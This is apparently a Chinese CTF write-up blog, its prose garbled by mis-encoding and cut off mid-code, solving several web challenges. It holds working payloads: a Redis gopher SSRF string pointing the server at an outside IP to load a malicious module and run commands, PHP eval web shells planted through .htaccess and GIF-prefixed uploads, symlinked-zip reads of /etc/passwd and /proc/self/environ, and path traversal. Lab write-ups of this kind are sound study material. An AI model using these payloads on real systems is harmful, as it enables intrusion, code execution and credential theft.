<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252412%250D%250A82.156.2.166%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2Ftmp%2Fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%25242%250D%250Als%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¼šæŠ¥é”™æ‰¾ä¸åˆ°<code>system.exec</code>å‘½ä»¤ï¼Œè¯´æ˜<code>exp.so</code>æ–‡ä»¶æ²¡æœ‰è¢«å¤åˆ¶è¿‡å»ï¼Œä½†æ˜¯æˆ‘ç”¨çš„ä¸æ˜¯buuçš„é¶æœºå‘€</p>
<h2 id="JMCTF-2021-UploadHub"><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h2><ul>
<li>php_flag engine</li>
<li>.htaccess</li>
</ul>
<p>åœ¨<code>apache2.conf</code>ä¸­è®¾ç½®äº†<code>php_flag engine off</code>ï¼Œè¿™ä½¿å¾—ä¸ä¼šè§£æphpæ–‡ä»¶ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶å¯ä»¥å‘ç°å¯ä»¥ä¸Šä¼ <code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory ~ &quot;/var/www/html/upload/[a-f0-9]&#123;32&#125;/&quot;&gt;</span><br><span class="line">        php_flag engine off</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">AccessFileName .htaccess</span><br></pre></td></tr></table></figure>

<h4 id="0x01-æ—¥å¸¸è¸©å‘"><a href="#0x01-æ—¥å¸¸è¸©å‘" class="headerlink" title="0x01:æ—¥å¸¸è¸©å‘"></a>0x01:æ—¥å¸¸è¸©å‘</h4><p><code>config.php</code>ï¼Œè¿‡æ»¤äº†$_GETæ•°ç»„é‡Œçš„å•å¼•å·å’ŒåŒå¼•å·å’Œä¸€äº›å…³é”®å­—ï¼Œå…³é”®å­—å¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡ï¼Œä½†æ˜¯å•å¼•å·å’ŒåŒå¼•å·ä¸å¯ä»¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">	 <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">	 <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;from&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">	 <span class="variable">$_GET</span>[<span class="variable">$key</span>] =<span class="variable">$value</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>index.php</code>å¦‚æœsubmitæœ‰å€¼ï¼Œä¹Ÿå°±æ˜¯å¦‚æœå­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œå°±ä¼šåˆ¤æ–­æ–‡ä»¶åç¼€åå¹¶å¯¹æ–‡ä»¶åè¿›è¡Œç‰¹æ®Šç¬¦å·è½¬ä¹‰ï¼Œå¾ˆéš¾è¿›è¡Œsqlæ³¨å…¥ï¼Œä½†æ˜¯æˆ–è®¸å¯ä»¥åˆ©ç”¨å®½å­—èŠ‚ç»•è¿‡ï¼ˆå¤±è´¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$allow_type</span>=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span>=addslashes(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into img (filename) values (&#x27;<span class="subst">$filename</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id from img where filename=&#x27;<span class="subst">$filename</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>

<h4 id="0x02-åšé¢˜"><a href="#0x02-åšé¢˜" class="headerlink" title="0x02:åšé¢˜"></a>0x02:åšé¢˜</h4><p>æ—¢ç„¶æ¥å—<code>.htaccess</code>ï¼Œé‚£å°±ç›´æ¥ä¸Šä¼ </p>
<p>å› ä¸ºè®¾ç½®äº†<code>php_flag engine off</code>å¯¼è‡´ä¸èƒ½è§£æphpæ–‡ä»¶ï¼Œä½†æ˜¯<code>.htaccess</code>æ˜¯å¯ä»¥é‡æ–°è®¾ç½®çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">Require all granted  </span><br><span class="line">php_flag engine on	</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php eval($_POST[&#x27;dmind&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="HCTF-2018-Hideandseek"><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2><ul>
<li>è½¯é“¾æ¥ä»»æ„æ–‡ä»¶è¯»å–</li>
</ul>
<p>éšä¾¿ç™»å½•å°±å¯ä»¥äº†ï¼Œè¿›å»ä¹‹åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œç»™äº†hintå†åŠ ä¸Šsessionæ˜æ˜¾å°±æ˜¯flask_sessionï¼Œæ‹¿å»å¼ºåˆ¶è§£å¯†ä¸€ä¸‹å¯ä»¥å‘ç°ä¼šæŠŠusernameè®°å½•ï¼Œè€Œæˆ‘ä»¬ä¸€å¼€å§‹ç™»å½•çš„æ—¶å€™å¦‚æœå°è¯•ç™»å½•adminä¼šç™»ä¸ä¸Šå»ï¼Œè¯´æ˜æˆ‘ä»¬è¦ä¼ªé€ adminèº«ä»½ï¼Œé‚£ä¹ˆå°±æ˜¯è¦å»æ‰¾ä¸€ä¸‹<code>SECRET_KEY</code>äº†</p>
<p><img src="https://img-blog.csdnimg.cn/30636282c91747848279017b7aa22bf1.png" alt="image-20220628093422541"></p>
<p>éšä¾¿å‹ç¼©ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸Šä¼ ã€‚ä¼šå‘ç°ä»–ä¼šè‡ªåŠ¨â€œè§£æï¼ˆï¼Ÿï¼‰â€å‹ç¼©æ–‡ä»¶æŠŠæ–‡ä»¶å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œè¯´æ˜æ˜¯å¦å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶</p>
<h4 id="è½¯è¿æ¥"><a href="#è½¯è¿æ¥" class="headerlink" title="è½¯è¿æ¥"></a>è½¯è¿æ¥</h4><ul>
<li>éœ€è¦ç»å¯¹è·¯å¾„</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s æºè·¯å¾„ ç›®æ ‡è·¯å¾„</span><br></pre></td></tr></table></figure>

<p>å°†æ–‡ä»¶ä¸å‘½ä»¤æ–‡ä»¶è¿›è¡Œè½¯è¿æ¥çš„æ—¶å€™ï¼Œç”Ÿæˆçš„æ–‡ä»¶æ˜¯å¯æ‰§è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œåªæ˜¯è·å–æ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥å’Œè½¯è¿æ¥åˆ°å‘½ä»¤æ–‡ä»¶æ²¡å¤šå¤§ç”¨</p>
<p><img src="https://img-blog.csdnimg.cn/3c6e1fc7e5d941ce8520182ad0a2ec1e.png" alt="image-20220628095312930"></p>
<h4 id="åšé¢˜-4"><a href="#åšé¢˜-4" class="headerlink" title="åšé¢˜"></a>åšé¢˜</h4><p>ç›´æ¥è¯•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd passwd</span><br><span class="line">zip --symlinks passwd.zip passwd</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¹‹åå¯ä»¥å¾—åˆ°æ–‡ä»¶å†…å®¹ï¼Œé‚£å°±å°è¯•çœ‹ä¸€ä¸‹ç¯å¢ƒå˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /proc/self/environ environ</span><br><span class="line">zip --symlinks env.zip environ</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“å·¥ä½œç›®å½•æ˜¯åœ¨<code>app</code>ä¸‹ï¼Œå­˜åœ¨<code>/app/uwsgi.ini</code>ç­‰</p>
<p><img src="https://img-blog.csdnimg.cn/09cacbd28f474ac68e1b4e25df92d46a.png" alt="image-20220628100951673"></p>
<p>æŸ¥çœ‹<code>uwsgi.ini</code>ä¹‹åå‘ç°æœ‰æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰å†…å®¹ï¼Œå°±è¿™æ ·å¡äº†ï¼ˆï¼ˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[uwsgi] module = main callable=app logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</span><br></pre></td></tr></table></figure>

<p>buuï¼ˆï¼ˆï¼ˆï¼ˆ</p>
<blockquote>
<p>buuojçš„ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œ /app/uwsgi.iniå›æ˜¾ä¸­åº”è¯¥æ˜¯module=/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.pyï¼Œè¯»å–/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.pyå³å¯å¾—åˆ°æºæ–‡ä»¶</p>
</blockquote>
<p><code>main.py</code></p>
<p>é¦–å…ˆï¼Œ<code>random.seed()</code>çš„ä½œç”¨å’Œphpçš„<code>mt_srand</code>ä½œç”¨æ˜¯ç›¸åŒçš„ï¼Œå­˜åœ¨ç§å­çš„æ—¶å€™äº§ç”Ÿçš„éšæœºæ•°å…¶å®æ˜¯ä¼ªéšæœºçš„</p>
<blockquote>
<p>è¯¥ **<code>uuid.getnode()</code>**å‡½æ•°ç”¨äºè·å–ç½‘ç»œæ¥å£çš„MACåœ°å€ã€‚å¦‚æœæœºå™¨å…·æœ‰å¤šä¸ªç½‘ç»œæ¥å£ï¼Œåˆ™è¿”å›é€šç”¨ç®¡ç†çš„MACåœ°å€ï¼Œè€Œä¸æ˜¯é€šè¿‡æœ¬åœ°ç®¡ç†çš„MACåœ°å€è¿”å›ã€‚ç®¡ç†çš„MACåœ°å€ä¿è¯æ˜¯å…¨å±€å”¯ä¸€çš„</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¦å»è·å–MACåœ°å€å¹¶å°†MACåœ°å€è½¬æˆåè¿›åˆ¶ï¼Œç”¨äºç”Ÿæˆä¼ªéšæœºæ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /sys/class/net/eth0/address add</span><br><span class="line">zip --symlinks add.zip add</span><br></pre></td></tr></table></figure>

<p>MACåœ°å€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c6:36:6d:36:ea:50</span><br><span class="line">&gt;&gt; 217937062849104</span><br><span class="line"></span><br><span class="line">éšæœºæ•°</span><br><span class="line">&gt;&gt; 30.338594317945777</span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸æ˜¾ç¤ºäº†ï¼Œè¯´æ˜å¯†é’¥æ˜¯æ­£ç¡®çš„ï¼Œé‚£ä¹ˆç›´æ¥ä¼ªé€ </p>
<p><img src="https://img-blog.csdnimg.cn/a06b9b2844744d4ab236de7c367c6b4a.png" alt="image-20220628110926925"></p>
<p>å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/15fc01cfa0d2498391aaef8067eea0e8.png" alt="image-20220628111151367"></p>
<h2 id="ç½‘é¼æ¯-2020-åŠå†³èµ›-faka"><a href="#ç½‘é¼æ¯-2020-åŠå†³èµ›-faka" class="headerlink" title="[ç½‘é¼æ¯ 2020 åŠå†³èµ›]faka"></a>[ç½‘é¼æ¯ 2020 åŠå†³èµ›]faka</h2><ul>
<li>thinkphp5.0.14</li>
</ul>
<h4 id="å®¡è®¡-2"><a href="#å®¡è®¡-2" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h4><p><code>sql</code>å­˜åœ¨adminç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `system_user` VALUES (10005,&#x27;admin&#x27;,&#x27;81c47be5dc6110d5087dd4af8dc56552&#x27;,NULL,&#x27;12345678@qq.com&#x27;,&#x27;12345678&#x27;,&#x27;demo&#x27;,264,&#x27;2020-03-20 14:38:56&#x27;,1,&#x27;3&#x27;,0,NULL,&#x27;2018-05-02 00:40:09&#x27;,NULL);</span><br><span class="line">&gt;&gt; admin admincccbbb123</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯thinkphp5ï¼Œè¯•ç€æ‰“ä¸€ä¸‹payloadï¼Œä¸è¿‡æ²¡è¿‡</p>
<p>ç›´æ¥å®¡è®¡å®åœ¨å¤ªç´¯äº†ï¼Œå…ˆè¿‡ä¸€ä¸‹å‰ç«¯ï¼Œå­˜åœ¨ç™»é™†æ³¨å†Œï¼Œæ³¨å†Œéœ€è¦é‚€è¯·ç ä½†æ˜¯é¢˜ç›®å·²ç»ç»™äº†ç›´æ¥ç™»å½•å°±å¥½ï¼Œä½†æ˜¯ç™»é™†é¡µé¢ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ¯”è¾ƒç‰¹åˆ«çš„å†…å®¹ï¼Œä¿®æ”¹å¯†ç å¤„çœ‹äº†æºç ä¹‹åä¹Ÿä¸å­˜åœ¨sqlæ³¨å…¥</p>
<p>é‚£å°±ç›´æ¥adminç™»å½•å¥½äº†</p>
<p><img src="https://img-blog.csdnimg.cn/c37c46641fc74ffab0f90371918ca093.png" alt="image-20220628141428714"></p>
<h4 id="è§£é¢˜1"><a href="#è§£é¢˜1" class="headerlink" title="è§£é¢˜1"></a>è§£é¢˜1</h4><p>åœ¨å¤‡ä»½ç®¡ç†å¤„å¯ä»¥è¿›è¡Œå¤‡ä»½å¹¶å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œç›´æ¥å¤åˆ¶é“¾æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://cb125922-f00c-469f-9f16-29370170d6fe.node4.buuoj.cn:81/manage/backup/downloadBak?file=test_20220628141557_429808621.sql</span><br></pre></td></tr></table></figure>

<p>ç‰¹å¾å¤ªæ˜æ˜¾äº†ç›´æ¥ä¸‹è½½<code>flag.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://cb125922-f00c-469f-9f16-29370170d6fe.node4.buuoj.cn:81/manage/backup/downloadBak?file=../../../../flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bb6451b6b3614b77be321e30b1b05eb0.png" alt="image-20220628150059050"></p>
<h4 id="è§£é¢˜2"><a href="#è§£é¢˜2" class="headerlink" title="è§£é¢˜2"></a>è§£é¢˜2</h4><p>å­˜åœ¨æ–‡ä»¶ä¸Šä¼ è·¯å¾„</p>
<p><img src="https://img-blog.csdnimg.cn/ba8e4110425442f0b890fc743a6eb289.png" alt="image-20220628141739116"></p>
<p>å…ˆå»çœ‹ä»£ç ï¼š</p>
<p><code>upload</code>å‡½æ•°ï¼Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥ä¸Šä¼ md5æ¥å¯¹æ–‡ä»¶è·¯å¾„ä»¥åŠæ–‡ä»¶åè¿›è¡Œæ“ä½œï¼Œç„¶åä¼šå¯¹æ–‡ä»¶ä¸Šä¼ è¿›è¡ŒTokenéªŒè¯ï¼Œä½†æ˜¯ç”±äº<code>session_id()</code>é»˜è®¤ä¸ºç©ºï¼Œæ‰€ä»¥ä¼šæ¯”è¾ƒå¥½éªŒè¯ï¼Œä¹‹åå°±æ˜¯åˆ°<code>File</code>ç±»ä¸­å¯¹æ–‡ä»¶ä¸Šä¼ è¿›è¡Œå¤„ç†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;request-&gt;file(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">        <span class="variable">$ext</span> = strtolower(pathinfo(<span class="variable">$file</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), <span class="number">4</span>)); <span class="comment">// ç›´æ¥è·å–åç¼€å</span></span><br><span class="line">        <span class="variable">$md5</span> = str_split(<span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;md5&#x27;</span>), <span class="number">16</span>); <span class="comment">// å°†postä¼ çš„md5çš„å€¼è¿›è¡Œ16é•¿åˆ†</span></span><br><span class="line">        <span class="variable">$filename</span> = join(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$md5</span>) . <span class="string">&quot;.<span class="subst">&#123;$ext&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (strtolower(<span class="variable">$ext</span>) == <span class="string">&#x27;php&#x27;</span> || !in_array(<span class="variable">$ext</span>, explode(<span class="string">&#x27;,&#x27;</span>, strtolower(sysconf(<span class="string">&#x27;storage_local_exts&#x27;</span>))))) &#123; <span class="comment">// åç¼€ä¸èƒ½ä¸ºphp å¦‚æœåç¼€ä¸å†</span></span><br><span class="line">            <span class="keyword">return</span> json([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶ä¸Šä¼ ç±»å‹å—é™&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶ä¸Šä¼ TokenéªŒè¯</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;token&#x27;</span>) !== md5(<span class="variable">$filename</span> . session_id())) &#123;</span><br><span class="line">            <span class="keyword">return</span> json([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶ä¸Šä¼ éªŒè¯å¤±è´¥&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶ä¸Šä¼ å¤„ç†</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$info</span> = <span class="variable">$file</span>-&gt;move(<span class="string">&#x27;static&#x27;</span> . DS . <span class="string">&#x27;upload&#x27;</span> . DS . <span class="variable">$md5</span>[<span class="number">0</span>], <span class="variable">$md5</span>[<span class="number">1</span>], <span class="literal">true</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$site_url</span> = FileService::getFileUrl(<span class="variable">$filename</span>, <span class="string">&#x27;local&#x27;</span>))) &#123;</span><br><span class="line">                <span class="keyword">return</span> json([<span class="string">&#x27;data&#x27;</span> =&gt; [<span class="string">&#x27;site_url&#x27;</span> =&gt; <span class="variable">$site_url</span>], <span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;SUCCESS&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> json([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>move</code>å‡½æ•°å‰åŠæ®µä¼šå¯¹æ–‡ä»¶è¿›è¡Œæ£€æµ‹ï¼Œæ£€æµ‹æ˜¯å¦åˆç†ä»¥åŠå›¾ç‰‡ç±»å‹ç­‰ï¼Œå¯ä»¥ç”¨<code>GIF89a</code>ç»•è¿‡ï¼Œç„¶åå°±æ˜¯å¯¹æ–‡ä»¶åè¿›è¡Œè§„åˆ™æ£€æµ‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$savename</span> = <span class="literal">true</span>, <span class="variable">$replace</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $path = static/upload/md5[0] $savename=md5[1]</span></span><br><span class="line">        <span class="comment">// æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œæ•è·é”™è¯¯ä»£ç </span></span><br><span class="line">        â€¦â€¦</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path</span> = rtrim(<span class="variable">$path</span>, DS) . DS;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶ä¿å­˜å‘½åè§„åˆ™</span></span><br><span class="line">        <span class="variable">$saveName</span> = <span class="keyword">$this</span>-&gt;buildSaveName(<span class="variable">$savename</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$path</span> . <span class="variable">$saveName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ£€æµ‹ç›®å½•</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;checkPath(dirname(<span class="variable">$filename</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸è¦†ç›–åŒåæ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$replace</span> &amp;&amp; is_file(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = [<span class="string">&#x27;has the same filename: &#123;:filename&#125;&#x27;</span>, [<span class="string">&#x27;filename&#x27;</span> =&gt; <span class="variable">$filename</span>]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ç§»åŠ¨æ–‡ä»¶ */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isTest) &#123;</span><br><span class="line">            rename(<span class="keyword">$this</span>-&gt;filename, <span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!move_uploaded_file(<span class="keyword">$this</span>-&gt;filename, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="string">&#x27;upload write error&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿”å› File å¯¹è±¡å®ä¾‹</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$file</span>-&gt;setSaveName(<span class="variable">$saveName</span>)-&gt;setUploadInfo(<span class="keyword">$this</span>-&gt;info);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>buildSaveName</code>ä¼šè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœè¿›è¡Œä¿å­˜çš„æ–‡ä»¶åé‡Œå¦‚æœä¸å­˜åœ¨<code>.</code>æ‰ä¼šå°†åç¼€ååŠ ä¸Šï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä¸€å¼€å§‹å°±æŠŠå€¼ç»™åˆ æ”¹äº†ï¼Œé‚£å°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!strpos(<span class="variable">$savename</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$savename</span> .= <span class="string">&#x27;.&#x27;</span> . pathinfo(<span class="keyword">$this</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), PATHINFO_EXTENSION);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸Šä¼ æ–‡ä»¶ï¼š</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">md5ï¼š</span><br><span class="line">å°†åå››ä½æ”¹æˆ`.php`</span><br></pre></td></tr></table></figure>

<h2 id="FBCTF2019-Products-Manager"><a href="#FBCTF2019-Products-Manager" class="headerlink" title="FBCTF2019]Products Manager"></a>FBCTF2019]Products Manager</h2><ul>
<li>åŸºäºçº¦æŸæ¡ä»¶çš„SQLæ³¨å…¥</li>
</ul>
<p><code>www.zip</code></p>
<p>å­˜åœ¨å¢åŠ å’ŒæŸ¥çœ‹<code>product</code>çš„åŠŸèƒ½ï¼Œè€Œåœ¨<code>db.php</code>çš„æ³¨é‡Šä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¡¨çš„ç»“æ„ä»¥åŠflagåœ¨<code>facebook</code>ä¸­ï¼Œå¹¶ä¸”<code>products</code>çš„nameå¹¶æ²¡æœ‰åœ¨æ•°æ®åº“ä¸­è§„å®šuniqueï¼Œè€Œåªæ˜¯åœ¨åç«¯é€šè¿‡æŸ¥è¯¢æ¥æ£€æµ‹æ˜¯å¦å·²ç»å­˜åœ¨è¯¥è¡Œ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> products (</span><br><span class="line">  name <span class="type">char</span>(<span class="number">64</span>),</span><br><span class="line">  secret <span class="type">char</span>(<span class="number">64</span>),</span><br><span class="line">  description <span class="type">varchar</span>(<span class="number">250</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;facebook&#x27;</span>, sha256(....), <span class="string">&#x27;FLAG_HERE&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;messenger&#x27;</span>, sha256(....), ....);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;instagram&#x27;</span>, sha256(....), ....);</span><br><span class="line"><span 